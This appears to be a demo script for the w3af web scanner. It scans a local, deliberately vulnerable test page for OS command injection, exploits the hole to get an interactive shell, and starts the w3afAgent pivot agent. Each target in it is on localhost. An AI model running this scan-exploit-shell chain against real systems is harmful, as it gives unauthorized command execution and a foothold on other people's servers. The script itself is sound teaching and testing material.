# This is the osCommanding demo for linux! ( with w3afAgent )

misc-settings
set interface lo
set localAddress 127.0.0.1
back

plugins
output console,textFile
output
output config textFile
set fileName output-w3af.txt
set verbosity 10
back
output config console
set verbosity 0
back
back

plugins
audit osCommanding
audit
back

target
set target http://localhost/w3af/osCommanding/vulnerable.php?command=list
back
start
exploit
exploit osCommandingShell

interact 0

start w3afAgent

exit


